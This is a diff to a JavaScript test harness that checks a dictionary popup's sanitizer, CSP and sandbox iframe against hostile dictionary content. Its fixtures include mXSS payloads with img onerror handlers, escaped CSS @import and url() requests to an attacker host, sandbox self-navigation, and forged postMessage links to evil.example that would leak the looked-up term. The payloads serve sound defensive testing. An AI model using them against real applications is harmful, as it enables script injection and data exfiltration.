@@ -51,7 +51,7 @@ async function evalOnServedPage(html, expr) {
   await driver.evalHere(`(location.href = ${JSON.stringify(PAGE_URL)}, 1)`);
   const deadline = Date.now() + 8000;
   while (Date.now() < deadline) {
-    await new Promise((r) => setTimeout(r, 100));
+    await new Promise((r) => setTimeout(r, 20));
     try {
       if (await driver.evalHere(
         "location.href.endsWith('/page') && document.readyState === 'complete' && " +
@@ -87,20 +87,48 @@ function page(lockReply, dictStyles, parentActive) {
     '</head><body></body></html>';
 }
 
-// 渲染一个词典块，等锁桥 + iframe 加载 + 消息往返，然后回报主文档状态。
-// untilExpr：给了就等到该表达式为真（上限 8 秒）再回报，而不是固定等 1.5 秒——断言
-// 「某个桥调用**到了**」的场景不能押在固定时长上（CI 机器慢时沙箱可能还没跑完）。
-// 断言「某个调用**没到**」的场景仍用固定等待：那是它们的观察窗口。
-function renderExpr(content, untilExpr) {
+// 渲染后的「静止」信号，取代原先每个场景固定等 1.5 秒（20 个场景光等待就 30 秒，CI 上
+// 连同页面加载一起冲过 80 秒预算）。全是确定性事件，不押时长：
+// ① 有脚本块时，等宿主锁桥的 promise 落定——之后挂不挂沙箱已经决定；
+// ② 主文档每张 <img> 都已 load / error——onerror 一类攻击若漏网，此刻已经触发；
+// ③ 两帧 rAF + 一个宏任务，让样式 / 布局引起的副作用跑完。
+const SETTLE = `(async () => {
+  if (typeof __fushiBridgeLockPromise !== 'undefined' && __fushiBridgeLockPromise) {
+    await __fushiBridgeLockPromise.catch(() => {});
+  }
+  await new Promise((r) => setTimeout(r, 0));
+  await Promise.all([...document.images].map((img) => (img.complete ? null : new Promise((r) => {
+    img.addEventListener('load', r, { once: true });
+    img.addEventListener('error', r, { once: true });
+  }))));
+  await new Promise((r) => requestAnimationFrame(() => requestAnimationFrame(r)));
+  await new Promise((r) => setTimeout(r, 0));
+})()`;
+
+// 只有「某个请求 / 脚本**没发生**」又没有完成事件可等的断言才用观察窗口：外联场景（被
+// CSP 拦下的请求不产生任何事件）与导出路径（脱离文档的 tempDiv 里的图片）。
+const OBSERVE_MS = 300;
+
+// 沙箱脚本在全部消息之后发的哨兵：同一 frame 发给父页面的消息按序投递，父页面收到它时
+// 前面的 select / link 已经处理完。
+const SANDBOX_DONE = 'sandbox-done';
+const sandboxDone = "window.__calls.some((c) => c.name === 'reportJsError' && " +
+  `String((c.args[0] && c.args[0].message) || '').includes('${SANDBOX_DONE}'))`;
+
+// 渲染一个词典块，等到静止（SETTLE），再按需等 until 为真（上限 8 秒）或观察 observeMs，
+// 然后回报主文档状态。
+function renderExpr(content, { until, observeMs } = {}) {
   return `(async () => {
     const details = createGlossarySection('D', [{ content: ${JSON.stringify(content)},
       definitionTags: '', termTags: '', glossaryIndex: 0 }], 0, 0, 1);
     document.body.appendChild(details);
-    ${untilExpr
-    ? `for (const deadline = Date.now() + 8000; Date.now() < deadline && !(${untilExpr});) {
-      await new Promise((r) => setTimeout(r, 50));
+    await ${SETTLE};
+    ${until
+    ? `for (const deadline = Date.now() + 8000; Date.now() < deadline && !(${until});) {
+      await new Promise((r) => setTimeout(r, 20));
     }`
-    : 'await new Promise((r) => setTimeout(r, 1500));'}
+    : ''}
+    ${observeMs ? `await new Promise((r) => setTimeout(r, ${observeMs}));` : ''}
     const frames = [...document.querySelectorAll('iframe')];
     return {
       pwned: window.__pwned === undefined ? null : String(window.__pwned),
@@ -114,6 +142,7 @@ function renderExpr(content, untilExpr) {
         height: f.style.height })),
       documentCsp: (document.querySelector('meta[data-fushi-popup-csp]') || {}).content || null,
       calls: window.__calls.map((c) => c.name),
+      lookups: window.__calls.filter((c) => c.name === 'onLinkClick').map((c) => c.args[0]),
       reports: window.__calls.filter((c) => c.name === 'reportJsError')
         .map((c) => (c.args[0] && c.args[0].message) || ''),
       text: document.body.textContent,
@@ -134,13 +163,32 @@ const SCRIPTED = `<div id="t">static</div>
       message: 'probe:' + document.getElementById('t').textContent + ':' + reach + ':' + (window.__extLoaded || 0) }, '*');
     parent.postMessage({ __fushiDictSandbox: 1, type: 'select', text: 'spam', rect: {} }, '*');
     parent.postMessage({ __fushiDictSandbox: 1, type: 'link', href: 'https://evil.example/', text: 'x', rect: {} }, '*');
+    parent.postMessage({ __fushiDictSandbox: 1, type: 'error', message: '${SANDBOX_DONE}' }, '*');
   }, 50);
 </script>
 <script src="ext.js"></script>`;
 
-const driver = await launchChromeDriver();
+// 自己的总时限比 Dart 侧（80 秒）短：超时先报卡在哪个场景、关掉 Chrome 再退出，而不是被
+// Dart 一刀切掉、输出全丢、Chrome 成孤儿。每个场景通过时打一行进度。
+const HARNESS_DEADLINE_MS = 70000;
+let driver = null;
+let current = 'chrome launch';
+const watchdog = setTimeout(() => {
+  console.log(`TIMEOUT after ${HARNESS_DEADLINE_MS} ms in: ${current}`);
+  try { driver && driver.close(); } catch (_) { /* 已经在退出 */ }
+  server.close();
+  process.exit(1);
+}, HARNESS_DEADLINE_MS);
+const startedAt = Date.now();
 let passed = 0;
+const step = (name) => {
+  console.log(`ok ${passed} ${current} (${Date.now() - startedAt} ms)`);
+  current = name;
+};
+
+driver = await launchChromeDriver();
 try {
+  step('1');
   // 1. 结构化内容：标签白名单 + 危险 href。
   {
     const r = await driver.evalOnPage(page(LOCKED), renderExpr(JSON.stringify({
@@ -161,6 +209,7 @@ try {
     passed++;
   }
 
+  step('2');
   // 2. 不带脚本的 HTML 释义：净化后留在主文档。
   {
     const r = await driver.evalOnPage(page(LOCKED), renderExpr(
@@ -179,9 +228,13 @@ try {
     passed++;
   }
 
+  step('3');
   // 3. 带脚本的 HTML 释义 + 桥锁定成功：脚本只在沙箱 iframe 里跑。
   {
-    const r = await driver.evalOnPage(page(LOCKED), renderExpr(SCRIPTED));
+    const r = await driver.evalOnPage(page(LOCKED), renderExpr(SCRIPTED, {
+      until: `${sandboxDone} && [...document.querySelectorAll('iframe')]` +
+        ".every((f) => f.style.height !== '0px')",
+    }));
     assert.equal(r.pwned, null, `dictionary script must not touch the main window (${r.pwned})`);
     assert.equal(r.scriptsInMain, 0, 'no script element in the main document');
     assert.equal(r.frames.length, 1, 'scripted block mounted into one iframe');
@@ -200,6 +253,7 @@ try {
     passed++;
   }
 
+  step('4');
   // 4. 宿主回的不是专用值（没实现锁定）：不挂沙箱，只显示净化后的静态内容。
   for (const reply of [true, null, 'ok']) {
     const r = await driver.evalOnPage(page(reply), renderExpr(SCRIPTED));
@@ -210,6 +264,7 @@ try {
   }
   passed++;
 
+  step('5');
   // 5. 词典 styles.css：@import 与外部 url() 不进样式表，本地 url() 保留。
   {
     const r = await driver.evalOnPage(page(LOCKED, {
@@ -222,6 +277,7 @@ try {
     passed++;
   }
 
+  step('6');
   // 6. mXSS：净化后的树直接挂进文档，不经「序列化 → innerHTML」再解析（审查复现过 math 路径）。
   for (const [name, html] of [
     ['math-mglyph-style', '<math><mtext><table><mglyph><style><img src=x onerror="window.__pwned=\'mx\';' +
@@ -239,6 +295,7 @@ try {
   }
   passed++;
 
+  step('7');
   // 7. 导出卡片路径同样不能经 tempDiv.innerHTML 复活脚本（tempDiv 属于主文档）。
   {
     const mx = '<math><mtext><table><mglyph><style><img src=x onerror="window.__pwned=\'export\'">' +
@@ -247,7 +304,7 @@ try {
       window.lookupEntries = [{ glossaries: [{ dictionary: 'D', content: ${JSON.stringify(mx)},
         definitionTags: '', termTags: '' }] }];
       const html = constructGlossaryHtml(0);
-      await new Promise((r) => setTimeout(r, 500));
+      await new Promise((r) => setTimeout(r, ${OBSERVE_MS}));
       return { pwned: window.__pwned === undefined ? null : String(window.__pwned), html: String(html) };
     })()`);
     assert.equal(r.pwned, null, `export path must not execute (${r.pwned})`);
@@ -255,6 +312,7 @@ try {
     passed++;
   }
 
+  step('8');
   // 8. 外联兜底：正则追不完的写法（CSS 转义、image-set、imagesrcset、srcset、样式表里的
   //    转义 @import）一个请求都不能发出去——主文档 CSP 的 img/style/font-src 只认本地。
   {
@@ -270,24 +328,31 @@ try {
     for (const content of cases) {
       const r = await evalOnServedPage(page(LOCKED, {
         D: `@\\69mport '${EVIL}/dictcss-imp'; .x { background: \\75rl(${EVIL}/dictcss-url); }`,
-      }), renderExpr(content));
+      }), renderExpr(content, { observeMs: OBSERVE_MS }));
       assert.ok(r.documentCsp && /img-src/.test(r.documentCsp), 'document CSP installed');
       assert.deepEqual(realHits(), [], `no request may leave the popup (${content.slice(0, 80)})`);
     }
     passed++;
   }
 
+  step('9');
   // 9. 沙箱自导航：frame-src 在请求发出前拦住，frame 第二次 load 即被移除，导航后的页面
   //    （若真加载了）发来的消息也不被认。
   {
     const r = await evalOnServedPage(page(LOCKED), renderExpr(
-      `<div>s</div><script>setTimeout(function(){ location.href = '${EVIL}/nav?w=' + 'TERM'; }, 50);</script>`));
+      `<div>s</div><script>setTimeout(function(){ location.href = '${EVIL}/nav?w=' + 'TERM'; }, 50);</script>`,
+      {
+        until: "window.__calls.some((c) => c.name === 'reportJsError' && " +
+          "String((c.args[0] && c.args[0].message) || '').includes('sandbox navigated away'))",
+        observeMs: OBSERVE_MS,
+      }));
     assert.deepEqual(realHits(), [], `sandbox self-navigation must not reach the network (${hits})`);
     assert.equal(r.frames.length, 0, 'navigated sandbox frame is removed');
     assert.ok(!r.reports.some((m) => m.includes('from-evil')), 'messages from a navigated frame are ignored');
     passed++;
   }
 
+  step('10');
   // 10. 父页面有用户激活时（用户随便点了一下释义），沙箱脚本伪造的外链消息也不放行：
   //     父页面判断不了「点的就是这条链接」，所以沙箱来源只认回查词 / sound: 本地音频。
   //     同一 frame 紧接着（同一个回调里、零间隔）发的回查词链接必须照常生效——证明激活
@@ -301,16 +366,21 @@ try {
           href: 'https://evil.example/leak?q=TERM', text: 'x', rect: {} }, '*');
         parent.postMessage({ __fushiDictSandbox: 1, type: 'link',
           href: '?query=word', text: 'word', rect: {} }, '*');
+        parent.postMessage({ __fushiDictSandbox: 1, type: 'error', message: '${SANDBOX_DONE}' }, '*');
       }, 50);
-    </script>`, "window.__calls.some((c) => c.name === 'onLinkClick')"));
+    </script>`, { until: sandboxDone }));
     assert.equal(r.frames.length, 1, 'scripted block mounted into one iframe');
     assert.ok(!r.calls.includes('openLink'),
       `external link forged by the sandbox must not open even with parent activation (${r.calls})`);
-    assert.ok(r.calls.includes('onLinkClick'),
-      `lookup link from the same sandbox still works, so activation was in effect (${r.calls})`);
+    // 只认「查的是 word」：外链若漏过判据，会以 onLinkClick('x') 的形式先占掉节流、把真实
+    // 查词吞掉——只断言「有 onLinkClick」时这种回归照样全绿。
+    assert.deepEqual(r.lookups, ['word'],
+      `only the lookup link fires, so activation was in effect and the dropped external link took no throttle slot (${r.lookups})`);
     passed++;
   }
+  step('done');
 } finally {
+  clearTimeout(watchdog);
   await driver.close();
   server.close();
 }
